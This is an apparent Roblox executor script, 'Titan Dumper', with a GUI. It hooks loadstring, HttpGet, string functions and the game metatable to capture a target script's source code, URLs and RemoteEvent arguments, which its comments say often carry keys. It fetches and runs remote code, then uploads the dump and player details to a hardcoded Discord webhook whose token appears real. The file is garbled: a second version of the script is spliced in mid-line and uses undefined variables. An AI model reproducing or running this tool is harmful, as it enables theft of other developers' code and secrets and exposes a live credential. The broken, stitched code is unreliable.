--[[
    ╔════════════════════════════════════════════════════╗
    ║        ⚔️ TITAN DUMPER v9.0 [PC EDITION] ⚔️         ║
    ║        OPTIMIZED FOR: SOLARA / WAVE / SYNAPSE      ║
    ║        FEATURES: WRITEFILE + CLIPBOARD + GUI       ║
    ╚════════════════════════════════════════════════════╝
]]

local CONFIG = {
    WEBHOOK_URL = "https://discord.com/api/webhooks/1461254654082945186/Ixc8hGPOMXkeSr2AZK8E3reosEm5vNCHwF1AC_1JnLcuacpIsRVMG43godL8wU75S3Cw",
    AUTO_COPY = true, -- Otomatis copy hasil ke clipboard
    SAVE_TO_FILE = true -- Simpan hasil ke folder Workspace executor
}

local Services = {
    Http = game:GetService("HttpService"),
    Core = game:GetService("CoreGui"),
    Tween = game:GetService("TweenService"),
    Input = game:GetService("UserInputService")
}

local Logs = {}
local Hooks = {}

-- [ 1. PC UI SYSTEM ]
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = Services.Http:GenerateGUID(false)
ScreenGui.ResetOnSpawn = false

-- PC Executors usually support gethui
if gethui then
    ScreenGui.Parent = gethui()
else
    -- Fallback for Solara/Incognito
    pcall(function() ScreenGui.Parent = Services.Core end)
end

local Main = Instance.new("Frame")
Main.Size = UDim2.new(0, 500, 0, 350)
Main.Position = UDim2.new(0.5, -250, 0.5, -175)
Main.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
Main.BorderSizePixel = 0
Main.Active = true
Main.Draggable = true
Main.Parent = ScreenGui

local Stroke = Instance.new("UIStroke")
Stroke.Color = Color3.fromRGB(0, 255, 200)
Stroke.Thickness = 1.5
Stroke.Parent = Main
Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 8)

-- Header
local Title = Instance.new("TextLabel")
Title.Text = "TITAN INTERCEPTOR [PC]"
Title.Size = UDim2.new(1, -40, 0, 40)
Title.Position = UDim2.new(0, 15, 0, 0)
Title.BackgroundTransparency = 1
Title.TextColor3 = Color3.fromRGB(0, 255, 200)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 18
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = Main

local Close = Instance.new("TextButton")
Close.Text = "X"
Close.Size = UDim2.new(0, 40, 0, 40)
Close.Position = UDim2.new(1, -40, 0, 0)
Close.BackgroundTransparency = 1
Close.TextColor3 = Color3.fromRGB(255, 50, 50)
Close.Font = Enum.Font.GothamBold
Close.TextSize = 18
Close.Parent = Main
Close.MouseButton1Click:Connect(function() ScreenGui:Destroy() end)

-- Input
local InputBox = Instance.new("TextBox")
InputBox.Size = UDim2.new(0.94, 0, 0.25, 0)
InputBox.Position = UDim2.new(0.03, 0, 0.15, 0)
InputBox.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
InputBox.TextColor3 = Color3.fromRGB(220, 220, 220)
InputBox.Text = ""
InputBox.PlaceholderText = "Paste Script Target Here..."
InputBox.Font = Enum.Font.Code
InputBox.TextSize = 12
InputBox.TextXAlignment = Enum.TextXAlignment.Left
InputBox.TextYAlignment = Enum.TextYAlignment.Top
InputBox.ClearTextOnFocus = false
InputBox.TextWrapped = true
InputBox.Parent = Main
Instance.new("UICorner", InputBox).CornerRadius = UDim.new(0, 6)

-- Console
local Console = Instance.new("ScrollingFrame")
Console.Size = UDim2.new(0.94, 0, 0.35, 0)
Console.Position = UDim2.new(0.03, 0, 0.45, 0)
Console.BackgroundColor3 = Color3.fromRGB(5, 5, 8)
Console.ScrollBarThickness = 4
Console.Parent = Main
Instance.new("UICorner", Console).CornerRadius = UDim.new(0, 6)

local ListLayout = Instance.new("UIListLayout")
ListLayout.Parent = Console

local ActionBtn = Instance.new("TextButton")
ActionBtn.Text = "INITIATE DUMP"
ActionBtn.Size = UDim2.new(0.94, 0, 0.15, 0)
ActionBtn.Position = UDim2.new(0.03, 0, 0.83, 0)
ActionBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 150)
ActionBtn.TextColor3 = Color3.fromRGB(10, 10, 10)
ActionBtn.Font = Enum.Font.GothamBlack
ActionBtn.TextSize = 16
ActionBtn.Parent = Main
Instance.new("UICorner", ActionBtn).CornerRadius = UDim.new(0, 6)

-- [ 2. LOGIC SYSTEM ]

local function Log(msg, color)
    local lbl = Instance.new("TextLabel")
    lbl.Text = "> " .. msg
    lbl.Size = UDim2.new(1, 0, 0, 18)
    lbl.BackgroundTransparency = 1
    lbl.TextColor3 = color or Color3.fromRGB(200, 200, 200)
    lbl.Font = Enum.Font.Code
    lbl.TextSize = 12
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.Parent = Console
    Console.CanvasSize = UDim2.new(0, 0, 0, ListLayout.AbsoluteContentSize.Y)
    Console.CanvasPosition = Vector2.new(0, Console.CanvasSize.Y.Offset)
end

local function ProcessDump(target)
    table.clear(Logs)
    Log("Initializing PC Hooks...", Color3.fromRGB(0, 255, 255))
    
    -- PC HOOKING (More Aggressive)
    local Captured = false
    
    if getgenv().loadstring then
        local old_ls = getgenv().loadstring
        Hooks.ls = hookfunction(getgenv().loadstring, function(chunk)
            if not Captured and #chunk > 50 then
                Captured = true
                Log("SOURCE CODE CAPTURED!", Color3.fromRGB(0, 255, 0))
                table.insert(Logs, "-- [SOURCE CODE]\n" .. chunk)
            end
            return old_ls(chunk)
        end)
    end
    
    -- Hook HTTP Get for Keys/Raw Links
    local old_http = game.HttpGet
    Hooks.http = hookfunction(game.HttpGet, function(s, u, ...)
        Log("HTTP: " .. tostring(u), Color3.fromRGB(255, 255, 0))
        table.insert(Logs, "-- [HTTP] " .. tostring(u))
        return old_http(s, u, ...)
    end)

    Log("Executing Target...", Color3.fromRGB(255, 180, 0))
    
    task.spawn(function()
        local s, e = pcall(function()
            if target:find("loadstring") then loadstring(target)()
            else loadstring(game:HttpGet(target))() end
        end)
        if not s then Log("Error: " .. e, Color3.fromRGB(255, 50, 50)) end
    end)
    
    -- Wait 3 seconds (PC is fast)
    task.wait(3)
    
    -- CLEANUP
    if Hooks.ls then hookfunction(getgenv().loadstring, Hooks.ls) end
    hookfunction(game.HttpGet, Hooks.http)
    
    local Result = table.concat(Logs, "\n\n")
    if #Result > 10 then
        -- 1. COPY TO CLIPBOARD
        if CONFIG.AUTO_COPY and setclipboard then
            setclipboard(Result)
            Log("COPIED TO CLIPBOARD!", Color3.fromRGB(0, 255, 0))
        end
        
        -- 2. SAVE TO FILE
        if CONFIG.SAVE_TO_FILE and writefile then
            local fname = "TitanDump_" .. os.time() .. ".lua"
            writefile(fname, Result)
            Log("SAVED TO: workspace/" .. fname, Color3.fromRGB(0, 255, 0))
        end
        
        -- 3. WEBHOOK (Optional Backup)
        if request then
            Log("Uploading to Webhook...", Color3.fromRGB(100, 100, 255))
            local boundary = "---------------------------" .. Services.Http:GenerateGUID(false)
            request({
                Url = CONFIG.WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "multipart/form-data; boundary=" .. boundary},
                Body = "--" .. boundary .. "\r\nContent-Disposition: form-data; name=\"file\"; filename=\"PC_DUMP.lua\"\r\nContent-Type: text/plain\r\n\r\n" .. Result .. "\r\n--" .. boundary .. "--"
            })
            Log("SENT TO DISCORD", Color3.fromRGB(0, 255, 0))
        end
    else
        Log("FAILED TO CAPTURE", Color3.fromRGB(255, 0, 0))
    end
    
    ActionBtn.Text = "DUMP AGAIN"
end

ActionBtn.MouseButton1Click:Connect(function()
    if #InputBox.Text > 5 then
        ActionBtn.Text = "DUMPING..."
        ProcessDump(InputBox.Text)
    else
        Log("Input empty!", Color3.fromRGB(255, 50, 50))
    end
end)

Log("PC MODE READY.", Color3.fromRGB(0, 255, 0))    Label.TextSize = 10
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.Parent = ConsoleScroller
    ConsoleScroller.CanvasSize = UDim2.new(0, 0, 0, ConsoleList.AbsoluteContentSize.Y)
    if CONFIG.AUTO_SCROLL then
        ConsoleScroller.CanvasPosition = Vector2.new(0, ConsoleScroller.CanvasSize.Y.Offset)
    end
end

-- [ 2. ENGINE SYSTEM: GOD MODE HOOKS ]

local function AppendLog(category, content)
    if not content or typeof(content) ~= "string" then return end
    if #content < 4 then return end
    if LogCache[content] then return end
    
    LogCache[content] = true
    local clean = content:gsub("[\0-\31]", ""):gsub("\"", "\\\""):gsub("\\", "\\\\")
    table.insert(Logs, string.format('    ["%s"] = "%s";', category, clean))
    
    Notify("Captured [" .. category .. "]: " .. content:sub(1, 25) .. "...")
end

local function StartInterception(targetScript)
    if WEBHOOK_URL:find("YOUR_WEBHOOK") then
        Notify("ERROR: Webhook URL not set!", true)
        return
    end

    table.clear(Logs)
    table.clear(LogCache)
    
    Notify("SYSTEM: Initializing Hooks...")
    
    -- [ A. LOADSTRING HOOK ]
    if getgenv().loadstring then
        Hooks.ls = hookfunction(getgenv().loadstring, function(chunk)
            AppendLog("SOURCE_CODE", chunk)
            return Hooks.ls(chunk)
        end)
    end
    
    -- [ B. BASIC STRING HOOKS ]
    Hooks.char = hookfunction(string.char, function(...)
        local ret = Hooks.char(...)
        if ret then AppendLog("BYTE_ASM", ret) end
        return ret
    end)
    
    Hooks.concat = hookfunction(table.concat, function(t, sep, ...)
        local ret = Hooks.concat(t, sep, ...)
        if ret then AppendLog("STRING_BUILD", ret) end
        return ret
    end)
    
    Hooks.http = hookfunction(game.HttpGet, function(self, url, ...)
        AppendLog("HTTP_GET", url)
        return Hooks.http(self, url, ...)
    end)
    
    -- [ C. ADVANCED METATABLE HOOKING (NAME CALL) ]
    -- Menangkap pemanggilan method game seperti :Kick(), :FireServer()
    local mt = getrawmetatable(game)
    local old_nc = mt.__namecall
    setreadonly(mt, false)
    
    mt.__namecall = newcclosure(function(self, ...)
        local method = getnamecallmethod()
        local args = {...}
        
        -- Tangkap RemoteEvent (Sering bawa key/password)
        if method == "FireServer" and self:IsA("RemoteEvent") then
            for i, v in ipairs(args) do
                if typeof(v) == "string" then
                    AppendLog("REMOTE_ARG", v)
                end
            end
        end
        
        -- Tangkap Link dari setclipboard
        if method == "HttpGet" then
            AppendLog("HTTP_GET_NC", args[1])
        end
        
        return old_nc(self, ...)
    end)
    
    -- [ D. EXECUTION SANDBOX ]
    Notify("SYSTEM: Executing Payload...")
    
    task.spawn(function()
        local s, e = pcall(function()
            local func
            if targetScript:find("loadstring") or targetScript:find("game:HttpGet") then
                 func = loadstring(targetScript)
            else
                 func = loadstring(game:HttpGet(targetScript))
            end
            if func then func() end
        end)
        if not s then Notify("RUNTIME ERROR: " .. tostring(e), true) end
    end)
    
    -- [ E. COUNTDOWN & CLEANUP ]
    for i = 8, 1, -1 do
        ExecuteBtn.Text = "⏳ INTERCEPTING... " .. i .. "s"
        task.wait(1)
    end
    
    Notify("SYSTEM: Detaching Hooks...")
    
    -- Restore Hooks
    if Hooks.ls then hookfunction(getgenv().loadstring, Hooks.ls) end
    hookfunction(string.char, Hooks.char)
    hookfunction(table.concat, Hooks.concat)
    hookfunction(game.HttpGet, Hooks.http)
    mt.__namecall = old_nc
    setreadonly(mt, true)
    
    -- [ 3. NETWORK SYSTEM: MULTIPART UPLOADER ]
    Notify("NETWORK: Packaging Data...")
    ExecuteBtn.Text = "📤 UPLOADING..."
    
    local Header = string.format([[
--[[
    ⚔️ TITAN INTERCEPTOR v7.0 REPORT
    --------------------------------
    Target Game : %s
    Place ID    : %d
    Executor    : %s
    LocalPlayer : %s
    Time        : %s
]]
local DumpData = {
]], 
    game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
    game.PlaceId,
    (identifyexecutor and identifyexecutor() or "Unknown"),
    Players.LocalPlayer.Name,
    os.date("%c")
)

    local Footer = "\n}"
    local FinalData = Header .. table.concat(Logs, "\n") .. Footer
    
    local boundary = "---------------------------" .. HttpService:GenerateGUID(false)
    local body = "--" .. boundary .. "\r\n" ..
                 "Content-Disposition: form-data; name=\"file\"; filename=\"" .. CONFIG.FILE_PREFIX .. os.time() .. ".lua\"\r\n" ..
                 "Content-Type: text/plain\r\n\r\n" ..
                 FinalData .. "\r\n" ..
                 "--" .. boundary .. "--"
    
    local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
    
    if request then
        request({
            Url = CONFIG.WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "multipart/form-data; boundary=" .. boundary},
            Body = body
        })
        Notify("SUCCESS: Data sent to Discord!")
        ExecuteBtn.Text = "✅ SUCCESS"
    else
        Notify("FATAL: Executor does not support HTTP!", true)
        ExecuteBtn.Text = "❌ FAILED"
    end
    
    task.wait(2)
    ExecuteBtn.Text = "🚀 INITIATE INTERCEPTION"
end

-- [ EVENT LISTENER ]
ExecuteBtn.MouseButton1Click:Connect(function()
    local scriptTxt = InputBox.Text
    if #scriptTxt < 5 then
        Notify("ERROR: Script is too short!", true)
        return
    end
    StartInterception(scriptTxt)
end)

Notify("TITAN v7.0 INITIALIZED.")
Notify("Waiting for target...")
